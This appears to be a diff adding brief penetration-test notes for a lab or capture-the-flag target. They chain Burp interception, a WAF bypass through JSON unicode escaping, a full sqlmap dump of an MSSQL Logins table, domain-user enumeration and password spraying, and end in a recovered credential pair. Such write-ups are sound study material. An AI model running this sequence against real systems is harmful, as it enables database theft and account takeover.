@@ -1,0 +1,8 @@
+in api -->> burp intercept empty request -->> usernames and id found
+json body -->> waf bypass json unicode 
+sqlmap -->> sqlmap -r post-request.txt --level=5 --risk=3 --delay=5 --tamper=charunicodeescape --dbms=MSSQL -T Logins --dump
+hashes retrieved -->> 4 unique hashes
+enum domain users using sqli*
+password spray using domain users and unique hashes -->> tushikikatomo : finance1
+
+*https://blog.netspi.com/hacking-sql-server-procedures-part-4-enumerating-domain-accounts/
